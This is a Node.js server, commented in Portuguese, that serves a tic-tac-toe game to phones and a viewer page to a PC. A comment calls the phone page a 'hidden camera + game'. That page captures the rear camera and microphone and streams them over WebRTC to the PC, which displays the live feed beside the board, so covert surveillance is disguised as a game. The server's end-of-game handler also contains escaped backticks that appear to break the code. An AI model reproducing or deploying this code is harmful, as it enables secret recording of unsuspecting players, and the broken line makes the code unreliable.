const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// HTML direto na rota principal
app.get('/', (req, res) => {
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(req.headers['user-agent']);
  
  if (isMobile) {
    // Página do CELULAR - câmera oculta + jogo
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Jogo da Velha</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { text-align: center; color: #333; margin-bottom: 20px; font-size: 24px; }
        .status {
            text-align: center;
            font-size: 18px;
            margin: 15px 0;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 10px;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .cell:active { transform: scale(0.95); background: #e9ecef; }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        button {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .camera-status {
            font-size: 12px;
            color: #666;
            text-align: center;
            margin-top: 10px;
        }
        .player-symbol {
            text-align: center;
            font-size: 14px;
            color: #666;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Jogo da Velha</h1>
        <div class="player-symbol" id="playerSymbol"></div>
        <div class="status" id="status">Aguardando oponente no PC...</div>
        <div class="board" id="board"></div>
        <button id="resetBtn" disabled>Reiniciar Jogo</button>
        <div class="camera-status" id="cameraStatus">📷 Câmera iniciando...</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let board = ['', '', '', '', '', '', '', '', ''];
        let minhaVez = false;
        let meuSimbolo = '';
        let gameActive = false;
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // INICIAR CÂMERA (funciona em background)
        async function iniciarCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 320, 
                        height: 240,
                        facingMode: 'environment' // câmera traseira
                    }, 
                    audio: true 
                });
                
                document.getElementById('cameraStatus').innerHTML = '📷 Câmera ativa';
                
                // Criar conexão WebRTC
                const peer = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                // Adicionar tracks
                stream.getTracks().forEach(track => peer.addTrack(track, stream));
                
                // Enviar candidatos ICE
                peer.onicecandidate = (e) => {
                    if(e.candidate) socket.emit('candidate', e.candidate);
                };
                
                // Negociar conexão
                peer.onnegotiationneeded = async () => {
                    const offer = await peer.createOffer();
                    await peer.setLocalDescription(offer);
                    socket.emit('offer', offer);
                };
                
                // Receber answer do PC
                socket.on('answer', async (answer) => {
                    await peer.setRemoteDescription(answer);
                });
                
                socket.on('candidate', async (candidate) => {
                    try { await peer.addIceCandidate(candidate); } catch(e) {}
                });
                
            } catch (error) {
                document.getElementById('cameraStatus').innerHTML = '❌ Erro: ' + error.message;
            }
        }
        
        iniciarCamera();
        
        // Eventos do jogo
        socket.on('inicio', (data) => {
            meuSimbolo = data.simbolo;
            minhaVez = data.simbolo === 'X';
            gameActive = true;
            document.getElementById('playerSymbol').innerHTML = 'Você é: ' + meuSimbolo;
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do PC (X)';
            document.getElementById('resetBtn').disabled = false;
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cells = document.getElementsByClassName('cell');
            cells[data.pos].innerHTML = data.simbolo;
            cells[data.pos].classList.add(data.simbolo.toLowerCase());
            
            minhaVez = (data.proximaVez === meuSimbolo);
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
        });
        
        socket.on('fim', (data) => {
            gameActive = false;
            document.getElementById('status').innerHTML = data.mensagem;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            let cells = document.getElementsByClassName('cell');
            for(let i = 0; i < 9; i++) {
                cells[i].innerHTML = '';
                cells[i].classList.remove('x', 'o');
            }
            minhaVez = (meuSimbolo === 'X');
            gameActive = true;
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
        });
        
        document.getElementById('resetBtn').onclick = () => {
            socket.emit('reiniciar');
        };
    </script>
</body>
</html>
    `);
  } else {
    // Página do PC - mostra jogo + câmera do celular
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>PC - Jogo da Velha</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 1200px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 30px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .video-section {
            background: #000;
            border-radius: 10px;
            overflow: hidden;
        }
        video {
            width: 100%;
            height: auto;
            display: block;
        }
        .video-status {
            background: #333;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 14px;
        }
        .game-section {
            text-align: center;
        }
        h1 { color: #333; margin-bottom: 20px; }
        .status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 18px;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 30px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .cell:hover { background: #e9ecef; transform: scale(1.05); }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        .controls button {
            padding: 10px 20px;
            margin: 5px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        #resetBtn { background: #4CAF50; color: white; }
        #audioBtn { background: #3498db; color: white; }
        #audioBtn.muted { background: #e74c3c; }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-section">
            <video id="remoteVideo" autoplay playsinline></video>
            <div class="video-status" id="videoStatus">📱 Aguardando conexão do celular...</div>
        </div>
        
        <div class="game-section">
            <h1>🎮 Jogo da Velha</h1>
            <div class="status" id="status">Aguardando celular...</div>
            <div class="board" id="board"></div>
            <div class="controls">
                <button id="resetBtn" disabled>Reiniciar</button>
                <button id="audioBtn">🔊 Áudio</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let board = ['', '', '', '', '', '', '', '', ''];
        let minhaVez = true;
        let meuSimbolo = 'X';
        let gameActive = false;
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // Configurar WebRTC para receber vídeo
        const peer = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        
        const videoElement = document.getElementById('remoteVideo');
        
        peer.ontrack = (event) => {
            videoElement.srcObject = event.streams[0];
            document.getElementById('videoStatus').innerHTML = '📱 Celular conectado!';
        };
        
        peer.onicecandidate = (e) => {
            if(e.candidate) socket.emit('candidate', e.candidate);
        };
        
        // Receber oferta do celular
        socket.on('offer', async (offer) => {
            await peer.setRemoteDescription(offer);
            const answer = await peer.createAnswer();
            await peer.setLocalDescription(answer);
            socket.emit('answer', answer);
        });
        
        socket.on('candidate', async (candidate) => {
            try { await peer.addIceCandidate(candidate); } catch(e) {}
        });
        
        // Eventos do jogo
        socket.on('inicio', (data) => {
            meuSimbolo = 'X';
            minhaVez = true;
            gameActive = true;
            document.getElementById('status').innerHTML = 'Sua vez (X)';
            document.getElementById('resetBtn').disabled = false;
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cells = document.getElementsByClassName('cell');
            cells[data.pos].innerHTML = data.simbolo;
            cells[data.pos].classList.add(data.simbolo.toLowerCase());
            
            minhaVez = (data.proximaVez === 'X');
            document.getElementById('status').innerHTML = minhaVez ? 'Sua vez' : 'Vez do celular';
        });
        
        socket.on('fim', (data) => {
            gameActive = false;
            document.getElementById('status').innerHTML = data.mensagem;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            let cells = document.getElementsByClassName('cell');
            for(let i = 0; i < 9; i++) {
                cells[i].innerHTML = '';
                cells[i].classList.remove('x', 'o');
            }
            minhaVez = true;
            gameActive = true;
            document.getElementById('status').innerHTML = 'Sua vez';
        });
        
        document.getElementById('resetBtn').onclick = () => {
            socket.emit('reiniciar');
        };
        
        // Controle de áudio
        let audioAtivo = true;
        document.getElementById('audioBtn').onclick = () => {
            audioAtivo = !audioAtivo;
            videoElement.volume = audioAtivo ? 1 : 0;
            document.getElementById('audioBtn').innerHTML = audioAtivo ? '🔊 Áudio' : '🔇 Áudio';
            document.getElementById('audioBtn').classList.toggle('muted', !audioAtivo);
        };
    </script>
</body>
</html>
    `);
  }
});

// Lógica do jogo
let gameState = {
  board: ['', '', '', '', '', '', '', '', ''],
  currentPlayer: 'X',
  players: { pc: null, mobile: null },
  gameActive: false
};

function checkWinner() {
  const lines = [
    [0,1,2], [3,4,5], [6,7,8],
    [0,3,6], [1,4,7], [2,5,8],
    [0,4,8], [2,4,6]
  ];
  
  for(let line of lines) {
    const [a,b,c] = line;
    if(gameState.board[a] && 
       gameState.board[a] === gameState.board[b] && 
       gameState.board[a] === gameState.board[c]) {
      return gameState.board[a];
    }
  }
  return null;
}

io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  // Atribuir jogadores
  if (!gameState.players.pc) {
    gameState.players.pc = socket.id;
    socket.emit('inicio', { simbolo: 'X' });
  } else if (!gameState.players.mobile) {
    gameState.players.mobile = socket.id;
    socket.emit('inicio', { simbolo: 'O' });
    gameState.gameActive = true;
  }
  
  // WebRTC signaling
  socket.on('offer', (offer) => {
    socket.broadcast.emit('offer', offer);
  });
  
  socket.on('answer', (answer) => {
    socket.broadcast.emit('answer', answer);
  });
  
  socket.on('candidate', (candidate) => {
    socket.broadcast.emit('candidate', candidate);
  });
  
  // Jogadas
  socket.on('jogada', (pos) => {
    if (!gameState.gameActive) return;
    
    let jogador = socket.id === gameState.players.pc ? 'X' : 'O';
    if (jogador !== gameState.currentPlayer) return;
    if (gameState.board[pos] !== '') return;
    
    gameState.board[pos] = jogador;
    let vencedor = checkWinner();
    let proximaVez = gameState.currentPlayer === 'X' ? 'O' : 'X';
    
    if (vencedor) {
      gameState.gameActive = false;
      io.emit('fim', { mensagem: \`🎉 Jogador \${vencedor} venceu! 🎉\` });
    } else if (!gameState.board.includes('')) {
      gameState.gameActive = false;
      io.emit('fim', { mensagem: '🤝 Empate! 🤝' });
    } else {
      gameState.currentPlayer = proximaVez;
    }
    
    io.emit('jogada', { 
      pos, 
      simbolo: jogador, 
      proximaVez: gameState.currentPlayer 
    });
  });
  
  socket.on('reiniciar', () => {
    gameState.board = ['', '', '', '', '', '', '', '', ''];
    gameState.currentPlayer = 'X';
    gameState.gameActive = true;
    io.emit('reiniciar');
  });
  
  socket.on('disconnect', () => {
    if (socket.id === gameState.players.pc) gameState.players.pc = null;
    if (socket.id === gameState.players.mobile) gameState.players.mobile = null;
    gameState.gameActive = false;
    console.log('Cliente desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
